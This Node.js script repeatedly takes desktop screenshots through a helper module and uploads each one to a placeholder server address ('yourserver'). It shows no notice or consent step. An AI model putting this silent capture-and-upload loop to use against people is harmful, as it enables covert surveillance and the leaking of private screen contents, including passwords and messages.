// @ts-nocheck
const path= require('path');
const fs = require('fs');
const FormData = require('form-data');
const axios = require('axios');
const createScreenshotWithInterval = require('./screenshotdesktop.js');

const currentDirImage = path.join(__dirname, './screenshots/');
const currentDirText = path.join(__dirname, '.');

const sendFile = async(form) => {
  await axios.post(`https://yourserver/file`, form, {
    headers: {
      Accept: "application/json",
      "Content-Type":"multipart/form-data",
    }
  })
  .then(() => {
    console.log('Файл успешно отправлен на сервер!')
  })
  .catch((err) => {
    console.log('Ошибка отправки файла =>', err)
  })
}

const sendImageOnServer = async(time) => {

setInterval(() => {
  fs.stat(currentDirImage + 'screenshotone.png', (err, stats) => {
    if (err) {
      console.log("Файла в директории не существует!");
    } else {
      try {
        const form = new FormData();
        const fileToPathImage = currentDirImage + 'screenshotone.png'
        const file = fs.createReadStream(fileToPathImage);
      
        form.append('file', file);
        sendFile(form)

      } catch (error) {
        console.log('Ошибка отправки файла на сервер! =>', error)
      } 
    }
  })
}, time)

}

createScreenshotWithInterval(4500);
sendImageOnServer(5500);
